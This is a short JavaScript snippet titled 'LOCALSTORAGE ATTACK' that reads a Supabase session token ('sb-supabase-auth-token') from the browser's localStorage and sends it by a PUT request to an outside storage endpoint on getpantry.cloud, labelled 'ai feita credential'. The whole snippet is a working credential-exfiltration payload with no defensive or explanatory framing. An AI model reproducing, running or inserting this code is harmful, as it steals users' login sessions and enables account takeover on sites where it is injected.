// ========================LOCALSTORAGE ATTACK=====================================
var myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");

var raw = JSON.stringify({
  "name": "ai feita credential",
  "auth": localStorage.getItem("sb-supabase-auth-token")
});

var requestOptions = {
  method: 'PUT',
  headers: myHeaders,
  body: raw,
  redirect: 'follow'
};

fetch("https://getpantry.cloud/apiv1/pantry/e349a830-2b20-4a54-9403-3d26975b6f4f/basket/testBasket", requestOptions)
  .then(response => response.text())
  .then(result => console.log(result))
  .catch(error => console.log('error', error));
